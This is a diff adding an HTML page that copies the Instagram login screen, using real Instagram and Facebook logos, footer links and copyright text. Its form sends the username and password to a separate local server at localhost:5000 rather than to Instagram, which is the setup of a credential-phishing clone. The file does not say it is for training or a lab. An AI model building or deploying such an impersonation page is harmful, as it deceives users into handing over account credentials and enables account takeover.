@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo-container">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+            </div>
+            
+            <form class="login-form" action="http://localhost:5000/login" method="POST">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" required>
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="password" required>
+                    <label for="password">Password</label>
+                    <button type="button" class="show-password">Show</button>
+                </div>
+                
+                <button type="submit" class="login-btn">Log In</button>
+                
+                <div class="divider">
+                    <span>OR</span>
+                </div>
+                
+                <div class="fb-login">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/tInzwsw2pVX.png" alt="Facebook logo">
+                    <span>Log in with Facebook</span>
+                </div>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store"></a>
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play"></a>
+            </div>
+        </div>
+        
+        <div class="theme-toggle">
+            <input type="checkbox" id="theme-switch" class="theme-switch">
+            <label for="theme-switch" class="theme-label">
+                <span class="theme-icon">🌓</span>
+            </label>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Hashtags</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        <div class="copyright">
+            <select class="language-selector">
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="ja">日本語</option>
+            </select>
+            <span>© 2023 Instagram from Meta</span>
+        </div>
+    </footer>
+    
+    <script src="script.js"></script>
+</body>
+</html>
